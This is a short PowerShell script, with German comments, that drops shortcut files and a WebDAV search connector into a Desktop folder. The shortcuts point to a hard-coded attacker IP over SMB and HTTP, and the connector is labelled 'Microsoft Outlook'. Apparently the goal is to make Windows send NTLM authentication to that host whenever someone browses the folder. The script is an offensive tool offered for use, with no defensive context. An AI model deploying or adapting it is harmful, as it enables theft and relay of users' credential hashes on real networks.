# IP = Attacker
$ip = "172.18.5.116"
$fileName = "threat.png"
$lnkFolderName = "LNKs"
$desktopPath = [Environment]::GetFolderPath("Desktop")
$lnkFolderPath = Join-Path -Path $desktopPath -ChildPath $lnkFolderName

# Sicherstellen, dass der Zielordner existiert
if (-not (Test-Path -Path $lnkFolderPath)) {
    New-Item -ItemType Directory -Path $lnkFolderPath -Force | Out-Null
}

# Gemeinsame Link-Attribute
$linkIcon = "$env:windir\system32\shell32.dll, 3"
$linkWindowStyle = 1
$linkDescriptionBase = "Browsing this dir will trigger authentication"

# COM-Objekt für Link-Erstellung
$objShell = New-Object -ComObject WScript.Shell

# Definition der spezifischen Links
$linkDefinitions = @(
    @{
        Name        = "!SMB-Auth.lnk"  # "!" für maximale Priorisierung in der Sortierung
        TargetPath  = "\\$ip\$fileName"
        HotKey      = "Ctrl+Alt+S"
        Description = "$linkDescriptionBase (SMB)"
    },
    @{
        Name        = "!HTTP-Auth.lnk"
        TargetPath  = "\\$ip@80\$fileName"
        HotKey      = "Ctrl+Alt+H"
        Description = "$linkDescriptionBase (HTTP via UNC)"
    }
)

# Erstellung der Links
foreach ($link in $linkDefinitions) {
    $lnkPath = Join-Path -Path $lnkFolderPath -ChildPath $link.Name
    $lnk = $objShell.CreateShortcut($lnkPath)
    $lnk.TargetPath = $link.TargetPath
    $lnk.WindowStyle = $linkWindowStyle
    $lnk.IconLocation = $linkIcon
    $lnk.Description = $link.Description
    $lnk.HotKey = $link.HotKey
    $lnk.Save()
}

# Erstellung der WebDAV Search Connector Datei (.searchConnector-ms)
$searchConnectorContent = @'
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
'@

$searchConnectorPath = Join-Path -Path $lnkFolderPath -ChildPath "!WebDAV.searchConnector-ms"
$searchConnectorContent | Out-File -Encoding UTF8 -FilePath $searchConnectorPath -Force

Write-Output "Links und Search Connector wurden erfolgreich erstellt im Pfad: $lnkFolderPath"
